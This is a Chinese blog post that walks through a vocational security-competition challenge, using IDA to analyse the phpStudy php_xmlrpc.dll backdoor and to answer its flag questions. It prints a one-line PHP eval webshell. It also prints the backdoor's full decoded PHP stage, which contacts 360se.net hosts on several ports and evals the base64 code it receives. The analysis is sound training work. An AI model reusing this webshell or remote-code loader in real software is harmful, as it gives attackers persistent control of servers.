{"blogid": "125571512", "writerAge": "码龄3年", "writerBlogNum": "56", "writerCollect": "244", "writerComment": "51", "writerFan": "260", "writerGrade": "4级", "writerIntegral": "800", "writerName": "Ba1_Ma0", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_125571512.jpg", "writerRankTotal": "21028", "writerRankWeekly": "4965", "writerThumb": "136", "writerVisitNum": "68108", "blog_read_count": "1296", "blog_time": "于 2022-07-02 13:53:26 发布", "blog_title": "全国中职网络安全B模块之国赛题远程代码执行渗透测试 //PHPstudy的后门漏洞分析", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"_0\"></a>简介</h1>\n<p>需要工具和环境的可以加群809706080，有什么不会的也可以在里面提问，我看到会第一时间回答</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\0b412ae16be24b61be4515ee22446a33.png\"/></p>\n<h1><a id=\"1%091RCEBackdoorzipIDAFlag0x1000XXXX0x1000XXXX_6\"></a>1. 找出靶机桌面上文件夹1中的文件RCEBackdoor.zip，使用静态反编译工具IDA对该压缩包中的程序进行分析，根据提示来分析目标文件，将包含恶意代码基址偏移的范围作为Flag值提交（提交形式：0x1000XXXX-0x1000XXXX）；</h1>\n<p>进入桌面后，解压文件，可以看到有以下文件</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\605fc421ac4d4d419b68d629a91588df.png\"/></p>\n<p>通过我朋友雨泽的中间件漏洞文章和这个php的版本，可以猜到这题考的是前几年phpstudy的后门漏洞</p>\n<p>雨泽的文章链接：https://blog.csdn.net/liufdfd/article/details/125507247?spm=1001.2014.3001.5501</p>\n<p>phpstudy的后门漏洞大部分存在于：</p>\n<pre><code>phpStudy20180211版本 php5.4.45与php5.2.17 ext扩展文件夹下的php_xmlrpc.dll\nphpStudy20161103版本 php5.4.45与php5.2.17 ext扩展文件夹下的php_xmlrpc.dll\n</code></pre>\n<p>我们打开这个文件目录找到后门文件</p>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\098fa80c28974854832117d78a79673a.png\"/></p>\n<p>然后将文件拖入ida pro 分析</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c546584e49244303acec7b00e60b8a2c.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\000d826c2a4c49cf8683926d2bfba37f.png\"/></p>\n<p>我们按shift+f12可以显示出文件内的字符串，在下面可以发现这两个奇怪的字符串</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7330050174b2468a86d7265c35e5690c.png\"/></p>\n<p>这个是常用的php小马代码</p>\n<pre><code>&lt;?php @eval($_POST['cmd']);?&gt;\n</code></pre>\n<p>可以判断，这个字符串就是后门代码</p>\n<p>接下来我们交叉引用，跳转到执行这个代码的段，我们双击这个字符串</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\37177896686c4f2ca7e27d02317ad1f0.png\"/></p>\n<p>双击这个地方，跳转到执行代码的地方</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\91bf6f711722459b9acb0817ca77bfa9.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\acd9969570fe48e19770e28710f3a086.png\"/></p>\n<p>这就是代码执行的地方，我们可以按f5看一下这个段的伪代码</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\67ac0afcd58c4ca1a703601bc69e8794.png\"/></p>\n<p>根据题目，将包含恶意代码基址偏移的范围作为Flag值提交，</p>\n<p>我们通过从恶意代码执行的地方往上逆向分析，在这个while循环可以发现</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7ebdadd412e94b0eafc4f3ea9b1fc93f.png\"/></p>\n<p>从最下面的恶意代码执行的伪代码跟着我的思路走</p>\n<pre><code>    v10 = &amp;byte_10011B34;\n    v11 = asc_1000C028;\n    v41 = &amp;byte_10011B34;\n    v12 = 0;\n    v13 = asc_1000C028;\n    while ( 1 )\n    {\n      if ( *(_DWORD *)v13 == 39 )\n      {\n        v10[v12] = 92;\n        v41[v12 + 1] = *v11;    //v41获取了v11变量的内存地址\n        v12 += 2;\n        v13 += 8;\n      }\n      else\n      {\n        v10[v12++] = *v11;\n        v13 += 4;\n      }\n      v11 += 4;\n      if ( (int)v11 &gt;= (int)&amp;unk_1000C66C )   //如果v11变量里的值大于1000C66C内存地址里的值\n        break;\n      v10 = v41;   //v10变量=v41变量\n    }\n    spprintf(&amp;v41, 0, \"@eval(%s('%s'));\", aGzuncompress, v41);     //将@eval(%s('%s'));字符串和aGzuncompress里的值存入V41变量里\n</code></pre>\n<p>我只分析了一下关键地方的代码，其他地方的代码不怎么重要，在分析里可以知道，关键的偏移地址是V11里的值和if对比的1000C66C内存地址里的值</p>\n<h2><a id=\"Flag_96\"></a>将包含恶意代码基址偏移的范围作为Flag值提交</h2>\n<pre><code>0x1000C028-0x1000C66C\n</code></pre>\n<h1><a id=\"2%09Flagecho_101\"></a>2. 继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串拼接的函数名称作为Flag值提交；（提交形式：echo()）</h1>\n<p>这个就简单多了，我们继续在ida里分析</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2c85705307aa45e4948df392dac012f1.png\"/></p>\n<p>可以发现，拼接字符串函数名称是</p>\n<pre><code>spprintf\n</code></pre>\n<h1><a id=\"3%09Flag_112\"></a>3. 继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于格式化字符串的参数名称作为Flag值提交；（提交形式：%*）</h1>\n<p>恶意代码如下</p>\n<pre><code>@eval(%s('%s'));\n</code></pre>\n<p>由此可知，用于格式化字符串的参数名称是</p>\n<pre><code>%s\n</code></pre>\n<h1><a id=\"4%09Flag_122\"></a>4. 继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串传参的参数名称作为Flag值提交；（提交形式：%*）</h1>\n<p>通过上面的恶意代码和学过c语言的都知道，字符串传参的参数名称是</p>\n<pre><code>%s\n</code></pre>\n<h1><a id=\"5%09Windows71decodepyF1F2F3F4Flag_128\"></a>5. 找出靶机Windows7桌面上文件夹1中的decode.py文件并完善此文件，填写该文件当中空缺的F1、F2、F3、F4四个字符串，将四个字符串拼接后的内容作为Flag值提交</h1>\n<p>我们打开decode.py文件</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\094bfb09fcd34c9f839dfb01062931da.png\"/></p>\n<p>关键的f1,f2,f3,f4代码：</p>\n<pre><code>data = zlib.F1(data)\nflag = b'F2'\nhwrite.write(F3)\nhwrite.write(F4)\n#Flag=F1.F2.F3.F4\n</code></pre>\n<p>F1是python的zlib模块里的函数</p>\n<p>F1：</p>\n<pre><code>decompress\n</code></pre>\n<p>F2是程序aGzuncompress变量里的值</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b96dcee0e90d40f3abefa6977267d1d0.png\"/></p>\n<p>我们双击这个变量进入查看</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\70f149e6f350425d92bde540fafb0a03.png\"/></p>\n<p>F2：</p>\n<pre><code>gzuncompress\n</code></pre>\n<p>通过这段代码分析</p>\n<pre><code>flag = b'F2'\n\t\toffset = data.find(flag)\n\t\tdata = data[offset + 0x10:offset + 0x10 + 0x567*4].replace(b\"\\x00\\x00\\x00\",b\"\")\n\t\tdecodedata_1 = zlib.F1(data[:0x191])\n\t\tprint(hexdump(data[0x191:]))\n\t\tdecodedata_2 = zlib.F1(data[0x191:])\n\t\twith open(\"compres_data1.txt\",\"w\") as hwrite:\n\t\t\thwrite.write(F3)\n\t\t\thwrite.close\n\t\twith open(\"compres_data2.txt\",\"w\") as hwrite:\n\t\t\thwrite.write(F4)\n\t\t\thwrite.close\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ee2f6409b9014cad9078d2f85e53d37f.png\"/></p>\n<p>F3和F4分别为：</p>\n<pre><code>str(decodedata_1)和str(decodedata_2)\n</code></pre>\n<p>完整的flag为：</p>\n<pre><code>decompress.gzuncompress.str(decodedata_1).str(decodedata_2)\n</code></pre>\n<h1><a id=\"6%09decodepyFlag21222380_190\"></a>6. 执行decode.py后将生产两个文件，对第二个文件中内容进行分析并解码，将其中出现的端口列表中的所有端口号一招从小到大的顺序依次排列作为Flag值（如：21,22,23,80）提交；</h1>\n<p>我们填补完程序缺失的代码后执行</p>\n<p>从生成的第二个文件里可以发现</p>\n<pre><code>@ini_set(\"display_errors\",\"0\");\n    error_reporting(0);\n    function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){\n        $result = \"\";\n      $handle = stream_socket_client(\"tcp://{$ip}:{$port}\", $errno, $errstr,10);\n      if( !$handle ){\n        $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);\n        if( !$handle ){\n            return \"err\";\n        }\n      }\n      fwrite($handle, $sendMsg.\"\\n\");\n        while(!feof($handle)){\n            stream_set_timeout($handle, 2);\n            $result .= fread($handle, 1024);\n            $info = stream_get_meta_data($handle);\n            if ($info['timed_out']) {\n              break;\n            }\n         }\n      fclose($handle);\n      return $result;\n    }\n    $ds = array(\"www\",\"bbs\",\"cms\",\"down\",\"up\",\"file\",\"ftp\");\n    $ps = array(\"20123\",\"40125\",\"8080\",\"80\",\"53\");\n    $n = false;\n    do {\n        $n = false;\n        foreach ($ds as $d){\n            $b = false;\n            foreach ($ps as $p){\n                $result = tcpGet($i,$d.\".360se.net\",$p);\n                if ($result != \"err\"){\n                    $b =true;\n                    break;\n                }\n            }\n            if ($b)break;\n        }\n        $info = explode(\"&lt;^&gt;\",$result);\n        if (count($info)==4){\n            if (strpos($info[3],\"/*Onemore*/\") !== false){\n                $info[3] = str_replace(\"/*Onemore*/\",\"\",$info[3]);\n                $n=true;\n            }\n            @eval(base64_decode($info[3]));\n        }\n    }while($n);\n</code></pre>\n<p>端口号从小到大的顺序为：</p>\n<pre><code>53,80,8080,20123,40125\n</code></pre>\n<h1><a id=\"poc_248\"></a>poc利用</h1>\n<p>可以看雨泽写的文章，也是全国中职网络安全B模块的题，叫做中间件渗透测试</p>\n<pre><code>https://blog.csdn.net/liufdfd/article/details/125507247?spm=1001.2014.3001.5502\n</code></pre>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-07-02 13:53:26", "summary": "简介需要工具和环境的可以加群，有什么不会的也可以在里面提问，我看到会第一时间回答在这里插入图片描述找出靶机桌面上文件夹中的文件，使用静态反编译工具对该压缩包中的程序进行分析，根据提示来分析目标文件，将"}